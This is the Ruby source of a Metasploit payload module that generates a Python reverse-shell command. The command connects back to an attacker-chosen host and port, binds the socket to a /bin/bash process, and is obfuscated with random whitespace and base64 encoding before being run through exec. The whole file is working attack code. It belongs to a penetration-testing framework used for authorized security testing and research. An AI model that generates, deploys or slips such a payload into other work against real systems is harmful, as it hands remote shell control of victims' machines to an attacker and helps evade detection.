##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via Python)',
      'Version'     => '$Revision: 1 $',
      'Description' => 'Connect back and create a command shell via Python',
      'Author'      => 'bcoles',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'python',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_options([
      OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
    ])
  end

  def generate
    return super + command_string
  end

  #
  # Generate random whitespace
  #

  def random_padding
    " "*rand(10)
  end

  #
  # Generate command string
  #

  def command_string
    raw_cmd = "import socket,subprocess,os;host=\"#{datastore['LHOST']}\";port=#{datastore['LPORT']};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\"#{datastore['SHELL']}\")"
    obfuscated_cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
    encoded_cmd = Rex::Text.encode_base64(obfuscated_cmd)
    "python -c \"exec('#{encoded_cmd}'.decode('base64'))\""
  end
end
